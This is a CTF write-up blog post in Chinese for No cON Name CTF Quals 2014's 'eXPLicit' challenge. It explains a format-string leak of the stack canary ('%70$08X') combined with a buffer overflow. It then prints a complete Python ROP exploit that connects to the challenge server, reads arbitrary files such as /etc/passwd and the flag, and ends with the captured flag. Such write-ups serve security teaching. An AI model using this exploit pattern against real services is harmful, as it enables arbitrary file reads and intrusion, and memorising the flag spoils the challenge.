---
layout: post
title: No cON Name CTF Quals 2014 - eXPLicit
category: writeup
---

> Make me eXPLode! Hint: maybe you want to give a look at the binary... 
> https://ctf.noconname.org/chdownloads/explicit
> Url: 88.87.208.163:7070
> Points: 500

題目是個猜數字遊戲:

```sh
$ nc 88.87.208.163 7070
Welcome to Guess The Number Online!

Pick a number between 0 and 20:
```

<!--more-->

測試後可以發現程式存在 `Format String` 及 `Buffer Overflow` 的漏洞，但有 `Stack Canary`

配合 `Format String` 漏洞，我們可以先 leak 出 canary 的值，在不改變 canary 的同時覆蓋 return address

輸入字串 `%70$08X` ，就可以 leak 出 canary

下面是一個簡單的 ROP Payload，可以讀寫任意檔案，雖然我們不知道 flag 的路徑，
但透過讀取 `/etc/passwd`，還是可以得到 username，再進一步猜到 flag 路徑: `/home/ch5/flag.txt`

```py
#!/usr/bin/env python
import socket
import telnetlib
from struct import pack

addr_data = 0x080D50C0

addr_open = 0x805EEEA
addr_read = 0x805EF40
addr_write = 0x0805EFAA

pop3 = 0x0805C39E
pop2 = 0x080482f7

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('88.87.208.163', 7070))

# recv game message
print s.recv(1024)

# leak canary
s.send("0x%70$08X\n")
r = s.recv(1024)
index = r.index('0x')

canary = int(r[index+2:index+10], 16)
print "canary: ", hex(canary)

# payload
p = 'A' * 256
p += pack("<I", canary) # canary
p += 'A' * 12

# read(4, addr_data, 256)
p += pack("<I", addr_read)
p += pack("<I", pop3)
p += pack("<I", 4)
p += pack("<I", addr_data)
p += pack("<I", 256)

# open(addr_data, 0, 0)
p += pack("<I", addr_open)
p += pack("<I", pop3)
p += pack("<I", addr_data)
p += pack("<I", 0)
p += pack("<I", 0)

# read(5, addr_data, 1000)
p += pack("<I", addr_read)
p += pack("<I", pop3)
p += pack("<I", 5)
p += pack("<I", addr_data)
p += pack("<I", 1000)

# write(4, addr_data, 1000)
p += pack("<I", addr_write)
p += pack("<I", pop3)
p += pack("<I", 4)
p += pack("<I", addr_data)
p += pack("<I", 1000)

p += "\n"

s.send(p)
print s.recv(1024)
print s.recv(1024)

s.send("q\n")
print s.recv(1024)

s.send("/home/ch5/flag.txt")
print s.recv(1024)

print "\nFile Content: "
print s.recv(1024)

print "\n"

# interact
t = telnetlib.Telnet()
t.sock = s
t.interact()
```

Flag: `NcN_97740ead1060892a253be8ca33c6364a712b21d`
